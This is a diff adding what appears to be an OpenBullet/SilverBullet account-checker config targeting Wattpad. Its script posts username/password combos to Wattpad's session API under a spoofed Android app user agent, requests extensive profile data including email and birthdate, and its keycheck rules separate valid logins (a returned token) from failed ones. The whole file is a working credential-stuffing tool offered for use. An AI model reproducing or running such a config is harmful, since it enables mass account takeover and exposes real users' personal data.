@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "Wattpad",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-20T01:51:53.9379377+03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "saas",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Wattpad",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://api.wattpad.com/v4/sessions" 
+  CONTENT "type=wattpad&username=<USER>&password=<PASS>&fields=token%2Cga%2Cuser%28username%2Cdescription%2Cavatar%2Cname%2Cemail%2CgenderCode%2Clanguage%2Cbirthdate%2Cverified%2CisPrivate%2Cambassador%2Cis_staff%2Cfollower%2Cfollowing%2CbackgroundUrl%2CvotesReceived%2CnumFollowing%2CnumFollowers%2CcreateDate%2CfollowerRequest%2Cwebsite%2Cfacebook%2Ctwitter%2CfollowingRequest%2CnumStoriesPublished%2CnumLists%2Clocation%2CexternalId%2Cprograms%2CshowSocialNetwork%2Cverified_email%2Chas_accepted_latest_tos%2Cemail_reverification_status%2Clanguage%2Cinbox%28unread%29%2Chas_password%2CconnectedServices%29" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 615" 
+  HEADER "Host: api.wattpad.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Cookie: locale=en_US; lang=1; wp_id=7558461b-5ca6-4c37-af5f-4db24849c600" 
+  HEADER "User-Agent: Android App v9.14.0; Model: SM-G935F; Android SDK: 22; Connection: WiFi; Locale: en_US;" 
+  HEADER "Authorization: gyJp8LykESHBcLntrLevPA" 
+  HEADER "Accept-Language: en_US" 
+  HEADER "X-Accept-Language: en_US" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, that password is incorrect" 
+    KEY "Sorry, we couldn't find an account for this email address" 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":\"" 
+
